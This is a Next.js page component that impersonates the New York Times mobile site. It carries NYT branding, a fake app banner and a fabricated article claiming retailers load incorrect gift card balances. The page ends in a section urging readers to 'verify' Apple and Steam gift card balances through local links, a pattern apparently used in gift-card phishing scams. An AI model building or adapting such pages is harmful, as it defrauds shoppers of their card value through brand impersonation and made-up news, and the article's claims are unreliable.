import { useState, useRef } from 'react'
import Head from 'next/head'
import styles from '../styles/nyt.module.css'

export default function NytHome() {
  const [isPlaying, setIsPlaying] = useState(false)
  const audioRef = useRef(null)

  const togglePlay = () => {
    if (!audioRef.current) return

    if (isPlaying) {
      audioRef.current.pause()
    } else {
      audioRef.current.play()
    }
    setIsPlaying(!isPlaying)
  }

  return (
    <div className={styles.nytPage}>
      <Head>
        <title>The New York Times - Breaking News</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      {/* App Installation Top Bar */}
      <div className={styles.appBanner}>
        <div className={styles.nytIcon}>
          <img src="/nyt-icon.png" alt="NYT Icon" width="24" height="24" />
        </div>
        <div className={styles.bannerText}>
          <p className={styles.bannerTitle}>NYTimes: Breaking W...</p>
          <p className={styles.bannerSubtitle}>Global and Australian New York Times Breaking W</p>
        </div>
        <div style={{ textAlign: 'center', marginRight: '10px' }}>
          <button className={styles.getBtn}>Get</button>
          <span style={{ display: 'block', fontSize: '8px', color: '#666', marginTop: '2px' }}>In-App Purchases</span>
        </div>
        <button className={styles.closeBtn}>×</button>
      </div>

      {/* Header */}
      <header className={styles.header}>
        <div className={styles.headerTop}>
          <div className={styles.menuIcon}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M4 6h16M4 12h16M4 18h16" />
            </svg>
          </div>
          <div className={styles.nytLogo}>
            <img src="/nyt-text.png" alt="The New York Times" height="32" />
          </div>
          <div className={styles.accountIcon}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
            </svg>
          </div>
        </div>

        <div className={styles.subscribeBar}>
          <button className={styles.subscribeBtn}>Subscribe for $1/week</button>
        </div>

        {/* Categories Scroller */}
        <div className={styles.navScroll}>
          <span className={`${styles.navLink} ${styles.active}`}>U.S. Immigration</span>
          <span className={styles.navLink}>Travel Ban</span>
          <span className={styles.navLink}>Immigration Arrests</span>
          <span className={styles.navLink}>Sweeping Changes</span>
          <span className={styles.navLink}>Border Policy</span>
          <span className={styles.navLink}>H-1B Visas</span>
          <span className={styles.navLink}>Deferred Action</span>
          <span className={styles.navLink}>Visa Backlogs</span>
          <span className={styles.navLink}>Asylum Seekers</span>
          <span className={styles.navLink}>Path to Citizenship</span>
          <span className={styles.navLink}>Enforcement Actions</span>
          <span className={styles.navLink}>Refugee Resettlement</span>
          <span className={styles.navLink}>Work Permits</span>
          <span className={styles.navLink}>DACA Updates</span>
        </div>
      </header>

      {/* Article Content */}
      <main className={styles.article}>
        <h1 className={styles.headline}>
          Retailers Load Incorrect Balances on Gift Cards, Leaving Shoppers Short
        </h1>

        <p className={styles.summary}>
          Customers across the U.S. have reported buying $100 gift cards only to discover less money was actually loaded. Consumer advocates say errors at the register and faulty activation systems are to blame, and warn shoppers to always check the balance before leaving the store.
        </p>

        <div className={styles.articleActions}>
          <div className={styles.listenAction} onClick={togglePlay} style={{ cursor: 'pointer' }}>
            <div className={styles.circlePlay}>
              <audio
                ref={audioRef}
                src="/gift-card-glitches.m4a"
                onEnded={() => setIsPlaying(false)}
              />
              {isPlaying ? (
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M6 4h4v16H6zM14 4h4v16h-4z" />
                </svg>
              ) : (
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M8 5v14l11-7z" />
                </svg>
              )}
            </div>
            <span>Listen to this article · 3:50 min <span className={styles.learnMore}>Learn more</span></span>
          </div>
        </div>

        <div className={styles.articleActions} style={{ border: 'none', gap: '8px' }}>
          <button className={styles.shareBtn}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8m-12-6l6-6 6 6m-6-6v12" />
            </svg>
            Share full article
          </button>
          <div className={styles.iconOverlay}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6" />
            </svg>
          </div>
          <div className={styles.iconOverlay}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z" />
            </svg>
          </div>
          <div className={styles.iconOverlay} style={{ padding: '6px 14px' }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" />
            </svg>
            <span style={{ fontSize: '12px', marginLeft: '6px' }}>0</span>
          </div>
        </div>

        {/* Redirect Section */}
        <div className={styles.cardSection}>
          <p className={styles.surveyTitle}>Verify your card balance below to ensure full value is present.</p>

          <a href="/apple" className={`${styles.giftCardBtn} ${styles.appleBtn}`}>Check Apple Gift Card Balance</a>
          <a href="/steam" className={`${styles.giftCardBtn} ${styles.steamBtn}`}>Check Steam Wallet Balance</a>

          <div className={styles.surveyBox}>
            <div className={styles.surveyText}>
              Tell us about yourself. <strong>Take the survey.</strong>
            </div>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="2">
              <path d="M9 18l6-6-6-6" />
            </svg>
          </div>
        </div>
      </main>
    </div >
  )
}
